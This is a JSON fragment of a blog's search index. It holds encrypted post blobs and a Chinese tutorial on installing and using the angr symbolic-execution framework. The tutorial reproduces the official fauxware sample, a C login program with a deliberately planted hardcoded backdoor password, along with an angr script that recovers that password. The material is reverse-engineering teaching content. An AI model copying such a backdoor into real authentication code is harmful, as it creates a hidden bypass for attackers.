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","tags":[{"name":"angr","slug":"angr","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"},{"name":"ollvm","slug":"ollvm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"}]},{"title":"angr learning note","date":"2019-04-03T06:29:25.000Z","path":"2019/04/03/angr-learning-note/angr-learning-note/","text":"angr学习笔记安装macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是pip install angr却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。 It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team. 既然官方都这么说了，没理由不安装python3版本的，pip3 install angr一把梭吧。然后又报错了 SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39; 明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题 Building unicorn from source requires Python 2, so will fail inside a virtualenv where python gets you Python 3. If you encounter errors with pip install angr, you may need to first install unicorn separately, pointing it to your Python 2: UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn # Python 2 is probably /usr/bin/python on your macOS system 意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。 $ cd bindings/python $ sudo make install3 $ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot; 1.0.0 通过这样，我的python3环境中也安装了unicorn。这时候再执行pip3 install angr这下一路畅通，安装完成。 迫不及待尝试导入angr试下，结果又报错了 angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib Reason: image not found) 这个错误很明显，就是angr_native.dylib中加载libpyvex.dylib的时候找不到该动态库。看了下angr_native.dylib的macho格式里load command中加载libpyvex.dylib部分，发现是在其当前目录下去查找libpyvex.dylib和libunicorn.1.dylib。关于这个问题其实官方文档中也提及到这个问题 PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;` UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;` ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;` install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylib install_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib 就是通过重新指定加载libunicorn.dylib和libpyvex.dylib 的位置。执行完脚本以后，angr算是安装完成了。 使用直接上例子来学习，官方的fauxware例子 C源码如下 #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdlib.h&gt; char *sneaky = &quot;SOSNEAKY&quot;; int authenticate(char *username, char *password) { char stored_pw[9]; stored_pw[8] = 0; int pwfile; // evil back d00r if (strcmp(password, sneaky) == 0) return 1; pwfile = open(username, O_RDONLY); read(pwfile, stored_pw, 8); if (strcmp(password, stored_pw) == 0) return 1; return 0; } int accepted() { printf(&quot;Welcome to the admin console, trusted user!\\n&quot;); } int rejected() { printf(&quot;Go away!&quot;); exit(1); } int main(int argc, char **argv) { char username[9]; char password[9]; int authed; username[8] = 0; password[8] = 0; printf(&quot;Username: \\n&quot;); read(0, username, 8); read(0, &amp;authed, 1); printf(&quot;Password: \\n&quot;); read(0, password, 8); read(0, &amp;authed, 1); authed = authenticate(username, password); if (authed) accepted(); else rejected(); } 简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入 import angr filename = &#39;the/filepath/of/fauxware&#39; proj = angr.Project(filename, auto_load_libs=False) st = proj.factory.entry_state() while True: succ = st.step() if len(succ.successors) == 2: break st = succ.successors[0] st1, st2 = succ.successors print(st1, st2) print(st1.posix.dumps(0)) print(st2.posix.dumps(0)) 下面解释下这个python代码 proj = angr.Project(filename, auto_load_libs=False)加载一个二进制文件，然后得到一个程序开始处的状态st = proj.factory.entry_state()下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。 &lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt; b&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00&#39; b&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x80\\x80\\x80@\\x80\\x80\\x00\\x00&#39; 可以看出st1也就是成功授权的输入为SOSNEAKY。 基本概念factory该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。 blocks project.factory.block()给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。 block = proj.factory.block(proj.entry) block.pp() # 打印block反汇编代码 block.instructions # 指令个数 block.instruction_addrs # 指令地址list states angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。 state = proj.factory.entry_state() &lt;SimState @ 0x401670&gt; 既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。 # 访问寄存器和内存 &gt;&gt;&gt; state.regs.rip # get the current instruction pointer &lt;BV64 0x401670&gt; &gt;&gt;&gt; state.regs.rax &lt;BV64 0x1c&gt; &gt;&gt;&gt; state.mem[proj.entry].int.resolved # interpret the memory at the entry point as a C int &lt;BV32 0x8949ed31&gt; # 修改寄存器和内存 &gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64) &gt;&gt;&gt; state.regs.rsi &lt;BV64 0x3&gt; &gt;&gt;&gt; state.mem[0x1000].long = 4 &gt;&gt;&gt; state.mem[0x1000].long.resolved &lt;BV64 0x4&gt; 这些数据都是bitvectors，所以需要一个转换 &gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32) # create a 32-bit-wide bitvector with value 0x1234 &lt;BV32 0x1234&gt; # BVV stands for bitvector value &gt;&gt;&gt; state.solver.eval(bv) # convert to python int 0x1234 mem有几点需要注意： .type有char, short, int, long, size_t, uint8_t, uint16_t等 .resolved得到bitvector；.concrete得到int值 simulation managers state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。 &gt;&gt;&gt; simgr = proj.factory.simulation_manager(state) &lt;SimulationManager with 1 active&gt; &gt;&gt;&gt; simgr.active [&lt;SimState @ 0x401670&gt;] 这里我们用state去初始化了simulation managers得到了一组state。.active返回当前state。 &gt;&gt;&gt; simgr.step() &gt;&gt;&gt; simgr.active [&lt;SimState @ 0x1020300&gt;] &gt;&gt;&gt; simgr.active[0].regs.rip # new and exciting! &lt;BV64 0x1020300&gt; &gt;&gt;&gt; state.regs.rip # still the same! &lt;BV64 0x401670&gt; 通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。 待更新… 参考 https://docs.angr.io/core-concepts/ https://www.secpulse.com/archives/83197.html","tags":[{"name":"angr","slug":"angr","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"}]},{"title":"applepie writeup分析","date":"2019-04-02T06:02:40.000Z","path":"2019/04/02/applepie/applepie/","text":"Need password to decrypt! Incorrect Password! No content to display! U2FsdGVkX19oo5goSzKf5gkouvCiIVi9/cES8a54EXmAwgAlKZkkgHvAkn9LJTROiSd11m/PRJ0cbYI0Gx1T5RObJCKJB1JQJxvFiAX+TY0XuU17QJVJVVloVDC3YybuabFb0em7zXRLOMI1GxYfVL2LaMe+MMEJJMoVPTwxiiC8kelJk6zmvnmYApNkFp378XaIpf52KJ+C5qRufviPBhQm1QyvaOge2Iqg/n53wXW+kVBUzLkYHfsszSJ8m7etXSyHmJtbEnQRuimLqj7GBRR79DViYBFqUpHFmCheelD4HMX6DIl249s3rw/aBBcorOF4ENzEifd/3M7/vSb9dviXArM96ryTud2YbXUQJIJyN/k99PI9Sle4CpPmED9uq/e0TATcXyl48IFZxGbOOO/kWw1Q2pRZ2N6yRRYRydgWmMCYxhqzUopHgqzrjS5ZwkKXW7Jgmit0CA6vvBHgE7oZ2G1akqe/ZcFZZ7DK73J2G7k6eDydxzs8x2W3tiQeZCH1iQWi35ddgn1XtSxqRF6n636jZOQ23xELWNRvzk6akjD4GnuPv+UrFxDZ1L7zhMy8KSTSJghGQ4dD7tRkTLQyf1FR/CGa2qkZB8/PXVBCs9ZKWiaU9Lq9Qc+J2hvsp8MJ5eQgikhzHn3KMAdpRJkn8lz+YDJDUR6pAmkLxO0m3MYzjhjHWk5JPGb4aPSl43wAjVfuL7CkeGV9BF03io/wdkWbg